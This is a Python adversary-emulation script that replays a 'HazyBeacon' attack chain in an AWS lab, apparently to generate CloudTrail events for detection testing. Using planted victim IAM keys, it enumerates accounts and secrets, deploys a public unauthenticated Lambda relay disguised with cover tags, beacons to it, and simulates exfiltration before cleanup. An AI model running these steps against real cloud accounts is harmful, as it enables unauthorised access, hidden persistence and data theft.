"""
HazyBeacon - Automated Post-Exploitation Attack Script
Executes a 4-phase attack chain across Initial Access, Discovery,
Serverless Execution, Defense Evasion, C2, and simulated Exfiltration.

Entry point: run(outputs, region)
All dynamic resource values are read from `outputs` (Pulumi stack outputs).
Static resource names are hardcoded from resource_names.json.
"""
import sys
import time
import random
import io
import zipfile

import boto3
import botocore.exceptions
import requests

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ---------------------------------------------------------------------------
# Static resource names -- from infra/resource_names.json (known at design time)
# ---------------------------------------------------------------------------
VICTIM_IAM_USER    = "hazybeacon-victim-iam-user"
VICTIM_POLICY_NAME = "hazybeacon-victim-policy"
DECOY_ADMIN_USER   = "backup-svc-admin"
SECRET_NAME        = "prod/hazybeacon-lab/database-master-credentials"
TFSTATE_OBJECT_KEY = "terraform/prod/terraform.tfstate"
RELAY_FN_NAME      = "BackupHandler"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _step(msg):
    print(f"\n[*] {msg}")

def _ok(msg):
    print(f"    [+] {msg}")

def _err(msg):
    print(f"    [-] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))

def _make_session(key_id, secret, region):
    return boto3.Session(
        aws_access_key_id=key_id,
        aws_secret_access_key=secret,
        region_name=region,
    )

def _build_relay_zip():
    """Build BackupHandler deployment package in memory -- no disk write."""
    handler_src = (
        "import json\n"
        "def handler(event, context):\n"
        "    return {\n"
        "        'statusCode': 200,\n"
        "        'headers': {'Content-Type': 'application/json'},\n"
        "        'body': json.dumps({'status': 'ok', 'msg': 'beacon_ack', 'relay': 'sim'})\n"
        "    }\n"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("index.py", handler_src)
    return buf.getvalue()

def _wait_active(lam_client, fn_name, max_retries=12):
    """Poll until function State == Active before creating FunctionUrlConfig."""
    for _ in range(max_retries):
        try:
            cfg = lam_client.get_function(FunctionName=fn_name)["Configuration"]
            state = cfg.get("State", "Unknown")
            if state == "Active":
                return True
            _ok(f"  Function state={state} -- waiting 5s...")
        except botocore.exceptions.ClientError as e:
            _err(f"  GetFunction polling error: {e}")
            return False
        time.sleep(5)
    _err(f"  Timed out waiting for {fn_name} to reach Active state")
    return False

# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def run(outputs: dict, region: str = "us-east-1") -> None:
    # -- Resolve required dynamic outputs (Pulumi stack output keys) ----------
    victim_key_id = outputs.get("victim_access_key_id")
    if not victim_key_id:
        raise RuntimeError("Missing required output: victim_access_key_id")

    victim_key_secret = outputs.get("victim_secret_access_key")
    if not victim_key_secret:
        raise RuntimeError("Missing required output: victim_secret_access_key")

    exfil_bucket = outputs.get("exfil_bucket_name")
    if not exfil_bucket:
        raise RuntimeError("Missing required output: exfil_bucket_name")

    lambda_exec_role_arn = outputs.get("lambda_exec_role_arn")
    if not lambda_exec_role_arn:
        raise RuntimeError("Missing required output: lambda_exec_role_arn")

    # -- Build single credential session used across all phases ---------------
    # T1552.001 / T1078.004: victim static IAM key harvested from
    # ~/.aws/credentials by the HazyBeacon backdoor (UserData-simulated).
    # One session reused for phases 2-4, matching HazyBeacon's documented
    # single-token model -- never rotated per TI extract.
    victim_session = _make_session(victim_key_id, victim_key_secret, region)

    # Track whether BackupHandler cleanup succeeded -- reported in summary
    cleanup_ok = False

    print("\n" + "=" * 60)
    print("HAZYBEACON Adversary Emulation")
    print("=" * 60)
    print(f"  Region  : {region}")
    print(f"  Victim  : {VICTIM_IAM_USER}")
    print(f"  KeyId   : {victim_key_id[:8]}...")
    print(f"  Bucket  : {exfil_bucket}")
    print(f"  ExecRole: {lambda_exec_role_arn.split('/')[-1]}")

    # =========================================================================
    # PHASE 1: Credential Harvesting -- documented, no attack.py code
    # =========================================================================
    #
    # T1598.003 - Phishing for Information: Spearphishing Link
    # HazyBeacon sends a spearphishing link to the target developer. Clicking
    # installs the HazyBeacon backdoor on the developer workstation. Documented
    # only -- emulation begins with credentials pre-placed by EC2 UserData on
    # hazybeacon-dev-instance.
    #
    # T1552.001 - Unsecured Credentials: Credentials In Files
    # HazyBeacon backdoor reads ~/.aws/credentials and
    # ~/projects/infra-prod/terraform.tfstate on the compromised workstation.
    # EC2 UserData simulates this artifact. attack.py receives the harvested
    # credentials via outputs["victim_access_key_id"] and
    # outputs["victim_secret_access_key"]. No EC2 filesystem interaction.

    phase_delay()

    # =========================================================================
    # PHASE 2: Initial Access and Discovery
    # =========================================================================
    print("\n" + "=" * 60)
    print("PHASE 2 -- Initial Access and Discovery")
    print("=" * 60)

    sts = victim_session.client("sts")
    iam = victim_session.client("iam")
    s3  = victim_session.client("s3")
    sm  = victim_session.client("secretsmanager", region_name=region)

    # -- T1078.004: Valid Accounts -- Cloud Accounts ---------------------------
    _step("T1078.004 - Validating stolen IAM credentials (GetCallerIdentity, GetUser)")

    account_id = None
    try:
        id_resp = sts.get_caller_identity()
        account_id = id_resp.get("Account")
        _ok(f"GetCallerIdentity -- Account={account_id} Arn={id_resp.get('Arn')}")
    except botocore.exceptions.ClientError as e:
        _err(f"GetCallerIdentity: {e}")

    op_delay(2, 6)

    try:
        u = iam.get_user()["User"]
        _ok(f"GetUser -- {u['UserName']} (ARN: {u['Arn']})")
    except botocore.exceptions.ClientError as e:
        _err(f"GetUser: {e}")

    op_delay(30, 90)

    # -- T1087.004: Account Discovery -- Cloud Account -------------------------
    _step("T1087.004 - Enumerating IAM identities, S3 buckets, and SecretsManager")

    try:
        users = iam.list_users().get("Users", [])
        names = [u["UserName"] for u in users]
        _ok(f"ListUsers -- {len(users)} users: {names}")
        if DECOY_ADMIN_USER in names:
            _ok(f"  Honey account visible: {DECOY_ADMIN_USER} (canary -- alert if pivoted to)")
    except botocore.exceptions.ClientError as e:
        _err(f"ListUsers: {e}")

    op_delay(2, 6)

    try:
        roles = iam.list_roles().get("Roles", [])
        _ok(f"ListRoles -- {len(roles)} roles found")
    except botocore.exceptions.ClientError as e:
        _err(f"ListRoles: {e}")

    op_delay(2, 6)

    # GetAccountSummary: victim policy does not grant this; the AccessDenied
    # response is still captured in CloudTrail and fires anomaly detections.
    try:
        sm_map = iam.get_account_summary()["SummaryMap"]
        _ok(f"GetAccountSummary -- Users={sm_map.get('Users','?')} Roles={sm_map.get('Roles','?')}")
    except botocore.exceptions.ClientError as e:
        _err(f"GetAccountSummary: {e}")

    op_delay(2, 6)

    try:
        bucket_names = [b["Name"] for b in s3.list_buckets().get("Buckets", [])]
        _ok(f"ListBuckets -- {len(bucket_names)} buckets: {bucket_names}")
    except botocore.exceptions.ClientError as e:
        _err(f"ListBuckets: {e}")

    op_delay(2, 6)

    try:
        secrets = sm.list_secrets().get("SecretList", [])
        _ok(f"ListSecrets -- {len(secrets)} secrets: {[s['Name'] for s in secrets]}")
    except botocore.exceptions.ClientError as e:
        _err(f"ListSecrets: {e}")

    op_delay(2, 6)

    try:
        desc = sm.describe_secret(SecretId=SECRET_NAME)
        _ok(f"DescribeSecret -- Name={desc.get('Name')} ARN={desc.get('ARN')}")
    except botocore.exceptions.ClientError as e:
        _err(f"DescribeSecret({SECRET_NAME}): {e}")

    op_delay(30, 120)

    # -- T1069.003: Permission Groups Discovery -- Cloud Groups ----------------
    _step("T1069.003 - Enumerating IAM groups and policy attachments")

    all_groups = []
    try:
        all_groups = iam.list_groups().get("Groups", [])
        _ok(f"ListGroups -- {[g['GroupName'] for g in all_groups]}")
    except botocore.exceptions.ClientError as e:
        _err(f"ListGroups: {e}")

    op_delay(2, 5)

    user_groups = []
    try:
        user_groups = iam.list_groups_for_user(UserName=VICTIM_IAM_USER).get("Groups", [])
        _ok(f"ListGroupsForUser({VICTIM_IAM_USER}) -- {[g['GroupName'] for g in user_groups]}")
    except botocore.exceptions.ClientError as e:
        _err(f"ListGroupsForUser: {e}")

    op_delay(2, 5)

    # ListAttachedGroupPolicies + GetPolicy for each discovered group.
    # If no groups exist in the account, probe a common group name as a
    # realistic attacker guess -- either result still lands in CloudTrail.
    groups_to_probe = all_groups if all_groups else [{"GroupName": "developers"}]
    for grp in groups_to_probe:
        gname = grp["GroupName"]
        attached = []
        try:
            attached = iam.list_attached_group_policies(GroupName=gname).get("AttachedPolicies", [])
            _ok(f"ListAttachedGroupPolicies({gname}) -- {[p['PolicyName'] for p in attached]}")
        except botocore.exceptions.ClientError as e:
            _err(f"ListAttachedGroupPolicies({gname}): {e}")
        for policy in attached:
            op_delay(1, 3)
            try:
                pol = iam.get_policy(PolicyArn=policy["PolicyArn"])["Policy"]
                _ok(f"  GetPolicy -- {pol['PolicyName']} v{pol['DefaultVersionId']}")
            except botocore.exceptions.ClientError as ie:
                _err(f"  GetPolicy({policy['PolicyArn']}): {ie}")
        op_delay(1, 4)

    # Always issue at least one GetPolicy call regardless of what the group loop found --
    # ensures the CloudTrail event fires even when no groups or attached policies exist.
    _known_policy_arn = "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
    try:
        pol = iam.get_policy(PolicyArn=_known_policy_arn)["Policy"]
        _ok(f"GetPolicy ({pol['PolicyName']}) -- v{pol['DefaultVersionId']}")
    except botocore.exceptions.ClientError as e:
        _err(f"GetPolicy ({_known_policy_arn}): {e}")

    op_delay(2, 5)

    try:
        policy_names = iam.list_user_policies(UserName=VICTIM_IAM_USER).get("PolicyNames", [])
        _ok(f"ListUserPolicies({VICTIM_IAM_USER}) -- {policy_names}")
    except botocore.exceptions.ClientError as e:
        _err(f"ListUserPolicies: {e}")

    op_delay(2, 5)

    try:
        inline = iam.get_user_policy(UserName=VICTIM_IAM_USER, PolicyName=VICTIM_POLICY_NAME)
        stmts = inline.get("PolicyDocument", {}).get("Statement", [])
        _ok(f"GetUserPolicy({VICTIM_POLICY_NAME}) -- {len(stmts)} statement(s) retrieved")
    except botocore.exceptions.ClientError as e:
        _err(f"GetUserPolicy: {e}")

    phase_delay()

    # =========================================================================
    # PHASE 3: Execution and Defense Evasion
    # =========================================================================
    print("\n" + "=" * 60)
    print("PHASE 3 -- Execution and Defense Evasion")
    print("=" * 60)

    lam = victim_session.client("lambda", region_name=region)

    # -- T1648: Serverless Execution -- deploy BackupHandler relay -------------
    _step(f"T1648 - Deploying {RELAY_FN_NAME} Lambda relay (in-memory ZIP, PassRole)")

    zip_bytes = _build_relay_zip()
    fn_arn = None
    fn_url = None

    try:
        fn_resp = lam.create_function(
            FunctionName=RELAY_FN_NAME,
            Runtime="python3.12",
            Role=lambda_exec_role_arn,
            Handler="index.handler",
            Code={"ZipFile": zip_bytes},
            Description="Automated backup file processor",
            Timeout=30,
            MemorySize=128,
        )
        fn_arn = fn_resp.get("FunctionArn")
        _ok(f"CreateFunction -- {RELAY_FN_NAME} ARN={fn_arn}")
    except botocore.exceptions.ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "ResourceConflictException":
            _err(f"CreateFunction: {RELAY_FN_NAME} already exists (prior run) -- retrieving ARN")
            try:
                fn_arn = lam.get_function(FunctionName=RELAY_FN_NAME)["Configuration"]["FunctionArn"]
                _ok(f"GetFunction -- existing ARN: {fn_arn}")
            except botocore.exceptions.ClientError as ge:
                _err(f"GetFunction: {ge}")
        else:
            _err(f"CreateFunction: {e}")

    op_delay(2, 5)

    if fn_arn:
        _wait_active(lam, RELAY_FN_NAME)
        op_delay(1, 3)

        try:
            url_resp = lam.create_function_url_config(
                FunctionName=RELAY_FN_NAME,
                AuthType="NONE",
            )
            fn_url = url_resp.get("FunctionUrl")
            _ok(f"CreateFunctionUrlConfig -- AuthType=NONE URL={fn_url}")
        except botocore.exceptions.ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "ResourceConflictException":
                _err("CreateFunctionUrlConfig: URL already exists -- fetching existing")
                try:
                    fn_url = lam.get_function_url_config(FunctionName=RELAY_FN_NAME).get("FunctionUrl")
                    _ok(f"GetFunctionUrlConfig -- existing URL={fn_url}")
                except botocore.exceptions.ClientError as ge:
                    _err(f"GetFunctionUrlConfig: {ge}")
            else:
                _err(f"CreateFunctionUrlConfig: {e}")

        op_delay(2, 5)

        try:
            lam.add_permission(
                FunctionName=RELAY_FN_NAME,
                StatementId="FunctionURLAllowPublicAccess",
                Action="lambda:InvokeFunctionUrl",
                Principal="*",
                FunctionUrlAuthType="NONE",
            )
            _ok("AddPermission -- FunctionURLAllowPublicAccess (unauthenticated invoke enabled)")
        except botocore.exceptions.ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "ResourceConflictException":
                _err("AddPermission: FunctionURLAllowPublicAccess statement already exists")
            else:
                _err(f"AddPermission: {e}")

    op_delay(30, 120)

    # -- T1564: Hide Artifacts -- apply cover tags to BackupHandler ------------
    _step("T1564 - Applying organizational cover tags to BackupHandler")
    # HazyBeacon applies common IaC tag schemas so the function blends into
    # cost explorer and manual audit views. ManagedBy:terraform is particularly
    # effective -- auditors assume the function is tracked by the IaC pipeline.
    # Note: victim policy may not include lambda:TagResource; AccessDenied
    # response still lands in CloudTrail as TagResource20170331 event.

    if fn_arn:
        try:
            lam.tag_resource(
                Resource=fn_arn,
                Tags={
                    "Environment": "production",
                    "Team": "platform-engineering",
                    "CostCenter": "CC-1042",
                    "Owner": "backup-automation",
                    "ManagedBy": "terraform",
                },
            )
            _ok("TagResource -- BackupHandler tagged with ManagedBy:terraform cover tags")
        except botocore.exceptions.ClientError as e:
            _err(f"TagResource: {e}")
    else:
        _err("TagResource skipped -- no function ARN available")

    phase_delay()

    # =========================================================================
    # PHASE 4: Command and Control and Simulated Exfiltration
    # =========================================================================
    print("\n" + "=" * 60)
    print("PHASE 4 -- Command and Control and Simulated Exfiltration")
    print("=" * 60)

    # -- T1102: Web Service -- C2 beacon to BackupHandler Function URL ---------
    _step("T1102 - Simulating HazyBeacon C2 beacon to BackupHandler Function URL")
    # Payload is synthetic -- no real C2 data. Lambda Function URL in BUFFERED
    # mode transforms the Lambda return value into the HTTP response: the outer
    # 'body' string becomes the HTTP response body, so resp.json() directly
    # yields {'status','msg','relay'}. Assert msg == 'beacon_ack'.

    beacon_ok = False
    if fn_url:
        beacon_payload = {"beacon": "sim_01", "ts": str(int(time.time()))}
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        }
        last_status = None
        for attempt in range(1, 4):
            try:
                t0 = time.monotonic()
                resp = requests.post(fn_url, json=beacon_payload, headers=headers, timeout=15)
                latency_ms = int((time.monotonic() - t0) * 1000)
                last_status = resp.status_code
                try:
                    body = resp.json()
                except Exception:
                    body = {}
                msg = body.get("msg", "?")
                _ok(f"Beacon attempt {attempt}: HTTP {resp.status_code} latency={latency_ms}ms msg={msg}")
                if msg == "beacon_ack":
                    _ok("C2 relay operational -- beacon acknowledged")
                    beacon_ok = True
                    break
                # HTTP 403 on an AuthType:NONE URL is an authorization refusal, not a
                # cold start -- retrying will not help. An account-level control
                # (SCP/RCP, or a Lambda org policy) is blocking anonymous invoke.
                if resp.status_code == 403:
                    _err("  HTTP 403 -- anonymous invoke DENIED despite AuthType:NONE. "
                         "An account/org control is blocking public Function URL access; "
                         "not a cold start -- aborting retries.")
                    break
                if attempt < 3:
                    _err(f"  Unexpected response -- retrying in 5s")
                    time.sleep(5)
            except requests.exceptions.RequestException as e:
                _err(f"Beacon attempt {attempt} failed: {e}")
                if attempt < 3:
                    time.sleep(5)
        if not beacon_ok:
            if last_status == 403:
                _err("Beacon DENIED (HTTP 403) -- the AuthType:NONE endpoint exists (T1648/CloudTrail "
                     "signal fired) but an account/org control refuses anonymous invoke. Technique "
                     "surface deployed; live C2 blocked by environment.")
            elif last_status is not None:
                _err(f"Beacon not acknowledged after 3 attempts -- last HTTP {last_status} "
                     f"(no beacon_ack in response body).")
            else:
                _err("Beacon not acknowledged -- no HTTP response reached the endpoint "
                     "(network/transport error).")
    else:
        _err("Beacon skipped -- no Function URL available (CreateFunctionUrlConfig failed)")

    op_delay(30, 300)

    # -- T1090: Proxy -- documented, no attack.py implementation --------------
    # HazyBeacon uses BackupHandler as a proxy forwarding C2 traffic from the
    # compromised host to attacker-controlled backend infrastructure, obscuring
    # true C2 origins behind a legitimate *.lambda-url.<region>.on.aws domain.
    # Per operational constraint: live traffic forwarding is suppressed.
    # The AuthType:NONE Function URL + execution role combination represents
    # proxy presence without forwarding real payloads.
    _step("T1090 - Proxy: documented -- BackupHandler acts as static echo relay")
    print("    [proxy] Live traffic forwarding suppressed per operational constraint.")
    print("    [proxy] AuthType:NONE Function URL (Phase 3) represents proxy presence.")

    op_delay(5, 15)

    # -- T1041: Exfiltration Over C2 Channel -- simulated ----------------------
    _step("T1041 - Enumerating exfiltration targets in exfil bucket (read-only)")
    # S3 operations read-only. Object content is NOT retrieved or transmitted.
    # Keys and sizes logged to stdout only. A mock echo assertion (no network
    # socket) validates the exfil code path per T1041 operational constraint.

    exfil_keys = []
    try:
        contents = s3.list_objects_v2(Bucket=exfil_bucket).get("Contents", [])
        exfil_keys = [o["Key"] for o in contents]
        _ok(f"ListObjectsV2({exfil_bucket}) -- {len(exfil_keys)} objects: {exfil_keys}")
        print(f"    [SIMULATION] Would exfiltrate via C2 relay: {exfil_keys}")
    except botocore.exceptions.ClientError as e:
        _err(f"ListObjectsV2: {e}")

    op_delay(2, 6)

    # HeadObject on terraform.tfstate bait -- IAM action is s3:GetObject
    try:
        head = s3.head_object(Bucket=exfil_bucket, Key=TFSTATE_OBJECT_KEY)
        size = head.get("ContentLength", 0)
        _ok(f"HeadObject({TFSTATE_OBJECT_KEY}) -- {size} bytes -- high-value bait identified")
        print(f"    [SIMULATION] Would transmit {TFSTATE_OBJECT_KEY} ({size}B) via relay -- suppressed")
    except botocore.exceptions.ClientError as e:
        code = e.response["Error"]["Code"]
        if code in ("404", "NoSuchKey"):
            _err(f"HeadObject: {TFSTATE_OBJECT_KEY} not found in {exfil_bucket}")
        else:
            _err(f"HeadObject: {e}")

    # =========================================================================
    # CLEANUP: Remove Lambda artifacts created by this run
    # BackupHandler is NOT Pulumi-managed. pulumi destroy will not reap it.
    # Victim policy may lack DeleteFunction/DeleteFunctionUrlConfig/RemovePermission
    # -- errors are non-fatal. Failure is reported prominently in the summary.
    # =========================================================================
    _step("Cleanup -- removing Lambda artifacts created during emulation")

    cleanup_results = {}

    try:
        lam.remove_permission(
            FunctionName=RELAY_FN_NAME,
            StatementId="FunctionURLAllowPublicAccess",
        )
        _ok("RemovePermission -- FunctionURLAllowPublicAccess removed")
        cleanup_results["remove_permission"] = True
    except botocore.exceptions.ClientError as e:
        _err(f"RemovePermission: {e}")
        cleanup_results["remove_permission"] = False

    op_delay(1, 3)

    try:
        lam.delete_function_url_config(FunctionName=RELAY_FN_NAME)
        _ok("DeleteFunctionUrlConfig -- BackupHandler Function URL removed")
        cleanup_results["delete_url_config"] = True
    except botocore.exceptions.ClientError as e:
        _err(f"DeleteFunctionUrlConfig: {e}")
        cleanup_results["delete_url_config"] = False

    op_delay(1, 3)

    try:
        lam.delete_function(FunctionName=RELAY_FN_NAME)
        _ok("DeleteFunction -- BackupHandler removed")
        cleanup_results["delete_function"] = True
    except botocore.exceptions.ClientError as e:
        _err(f"DeleteFunction: {e}")
        cleanup_results["delete_function"] = False

    cleanup_ok = all(cleanup_results.values())

    # =========================================================================
    # SUMMARY
    # =========================================================================
    print("\n" + "=" * 60)
    print("HAZYBEACON Emulation Complete -- CloudTrail Events Generated")
    print("=" * 60)
    events = [
        "Phase 2 | T1078.004 | GetCallerIdentity          | sts.amazonaws.com",
        "Phase 2 | T1078.004 | GetUser                    | iam.amazonaws.com",
        "Phase 2 | T1087.004 | ListUsers                  | iam.amazonaws.com",
        "Phase 2 | T1087.004 | ListRoles                  | iam.amazonaws.com",
        "Phase 2 | T1087.004 | GetAccountSummary          | iam.amazonaws.com",
        "Phase 2 | T1087.004 | ListBuckets                | s3.amazonaws.com",
        "Phase 2 | T1087.004 | ListSecrets                | secretsmanager.amazonaws.com",
        "Phase 2 | T1087.004 | DescribeSecret             | secretsmanager.amazonaws.com",
        "Phase 2 | T1069.003 | ListGroups                 | iam.amazonaws.com",
        "Phase 2 | T1069.003 | ListGroupsForUser          | iam.amazonaws.com",
        "Phase 2 | T1069.003 | ListAttachedGroupPolicies  | iam.amazonaws.com",
        "Phase 2 | T1069.003 | ListUserPolicies           | iam.amazonaws.com",
        "Phase 2 | T1069.003 | GetUserPolicy              | iam.amazonaws.com",
        "Phase 2 | T1069.003 | GetPolicy                  | iam.amazonaws.com",
        "Phase 3 | T1648     | CreateFunction20150331     | lambda.amazonaws.com",
        "Phase 3 | T1648     | CreateFunctionUrlConfig    | lambda.amazonaws.com",
        "Phase 3 | T1648     | AddPermission20150331      | lambda.amazonaws.com",
        "Phase 3 | T1564     | TagResource20170331        | lambda.amazonaws.com",
        "Cleanup | ---       | RemovePermission20150331   | lambda.amazonaws.com",
        "Cleanup | ---       | DeleteFunctionUrlConfig    | lambda.amazonaws.com",
        "Cleanup | ---       | DeleteFunction20150331     | lambda.amazonaws.com",
    ]
    for ev in events:
        print(f"  {ev}")

    if not cleanup_ok:
        print()
        print("!" * 60)
        print("ACTION REQUIRED: BackupHandler Lambda cleanup FAILED")
        print("!" * 60)
        print()
        print("The victim IAM policy lacks delete/remove permissions.")
        print(f"BackupHandler is NOT Pulumi-managed -- pulumi destroy will NOT")
        print("remove it. An unauthenticated public Function URL may persist.")
        print()
        print("Run these commands with an account that has lambda:* rights:")
        print()
        print(f"  aws lambda remove-permission \\")
        print(f"    --function-name {RELAY_FN_NAME} \\")
        print(f"    --statement-id FunctionURLAllowPublicAccess \\")
        print(f"    --region {region}")
        print()
        print(f"  aws lambda delete-function-url-config \\")
        print(f"    --function-name {RELAY_FN_NAME} \\")
        print(f"    --region {region}")
        print()
        print(f"  aws lambda delete-function \\")
        print(f"    --function-name {RELAY_FN_NAME} \\")
        print(f"    --region {region}")
        print()
        print("!" * 60)
    else:
        print()
        print("[OK] Lambda cleanup complete -- no orphaned resources.")
